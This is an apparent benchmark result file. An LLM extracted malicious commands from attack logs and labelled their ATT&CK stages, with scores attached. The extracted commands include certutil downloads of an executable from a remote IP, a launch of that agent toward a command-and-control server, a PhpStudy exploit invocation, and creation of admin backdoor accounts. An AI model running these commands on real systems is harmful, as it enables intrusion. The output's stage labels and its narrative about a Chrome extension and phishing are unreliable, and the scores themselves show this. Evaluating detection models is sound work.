@@ -1,0 +1,110 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "taskkill /f /im agent.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.224.153.87:8443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Collection"
+      },
+      {
+        "command": "del /f /q PhpStudyPoc.py",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"echo start:f98e6367-e38b-4e53-ba83-c58ede5c85fc\"",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"cmd /c 'python PhpStudyExp2.py http://121.36.30.176/ \"taskkill /f /im agent.exe&certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe&cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.224.53.87:8443\"'",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "power shell.exe -ExecutionPolicy Bypass -C \"echo end:f98e6367-e38b-4e53-ba83-c58ede5c85fc\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"echo start:dbb2f234-101f-4f44-bb97-72263635f506\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"cmd /c 'python PhpStudyExp2.py http://121.36.30.176/ \"taskkill /f /im agent.exe&certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe&cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.224.53.87:8443\"'",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "net user nbb nb123. /add",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "net localgroup administrators nbb /add",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "net user oop o33 /add",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "tasklist /svc | findstr TermService",
+        "stage": "Discovery"
+      },
+      {
+        "command": "netstat -ano | findstr 88",
+        "stage": "Discovery"
+      }
+    ],
+    "narrative": "The attackers use an unknown Chrome extension as a vector to deliver additional payloads, including the PHP Study Exploit using Python scripts and other tools such as Cert Util and Task Kill. They also use PowerShell to create new accounts and move laterally within the network. The attack chain includes Initial Access via phishing or exploitation of vulnerabilities, Execution of the payload, followed by Privilege Escalation through adding users to admin groups. Credential access follows when they add new users, leading to Lateral Movement and Command and Control activities.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 16676,
+      "completion_tokens": 876,
+      "total_tokens": 17552,
+      "wall_clock_s": 14.178,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.26666666666666666,
+      "recall": 0.4444444444444444,
+      "f1": 0.33333333333333337,
+      "tp": 4,
+      "fp": 11,
+      "fn": 5
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 15,
+      "fn": 6,
+      "recall_partial": 0.08333333333333333
+    },
+    "hallucination_rate": 0.2,
+    "cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 16676,
+      "completion_tokens": 876,
+      "total_tokens": 17552,
+      "wall_clock_s": 14.178,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v3_stagedefs",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
